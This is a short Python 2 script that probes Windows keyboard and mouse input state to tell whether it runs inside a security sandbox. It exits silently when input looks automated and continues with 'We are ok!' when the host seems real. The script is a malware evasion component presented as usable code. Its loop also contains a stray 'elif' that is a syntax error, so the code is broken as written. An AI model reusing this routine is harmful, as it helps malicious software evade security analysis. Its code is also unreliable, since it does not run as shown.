#!/usr/bin/python2

import ctypes
import random
import time
import sys

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

keyStrokes = 0
mouseClicks = 0
doubleClicks = 0

class LastInputInfo(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint),
                ("dwTime", ctypes.c_ulong)]

def getLastInput():
    last = LastInputInfo()
    last.cbSize = ctypes.sizeof(LastInputInfo)

    user32.GetLastInputInfo(ctypes.byref(last))

    runTime = kernel32.GetTickCount()

    elapsed = runTime - last.dwTime

    print "[*] It's been %d milliseconds since the last input event." % elapsed

    return elapsed

def getKeyPress():
    global mouseClicks
    global keyStrokes

    for i in range(0, 0xff):
        if user32.GetAsyncKeyState(i) == -32767:
            if i == 0x01:
                mouseClicks += 1
                return time.time()
            elif i > 32 and i < 127:
                keyStrokes += 1

    return None

def detectSandbox():
    global mouseClicks
    global keyStrokes

    maxKeyStrokes = random.randint(10, 25)
    maxMouseClicks = random.randint(5, 25)

    doubleClicks = 0
    maxDoubleClicks = 10
    doubleClickThreshold = 0.250
    firstDoubleClick = None

    averageMouseTime = 0
    maxInputThreshold = 30000

    previousTimestamp = None
    detectionComplete = False

    lastInput = getLastInput()

    if lastInput >= maxInputThreshold:
        sys.exit(0)

    while not detectionComplete:
        keyPressTime = getKeyPress()

        if keyPressTime is not None and previousTimestamp is not None:
            elapsed = keyPressTime - previousTimestamp
            if elapsed <= doubleClickThreshold:
                doubleClicks += 1

                if firstDoubleClick is None:
                    firstDoubleClick = time.time()
                else:
                    if doubleClicks == maxDoubleClicks:
                        if keyPressTime - firstDoubleClick <= (maxDoubleClicks * doubleClickThreshold):
                            sys.exit(0)

            if keyStrokes >= maxKeyStrokes and doubleClicks >= maxDoubleClicks and mouseClicks >= maxMouseClicks:
                return

            previousTimestamp =  keyPressTime

            elif keyPressTime is not None:
                previousTimestamp = keyPressTime


detectSandbox()
print "We are ok!"
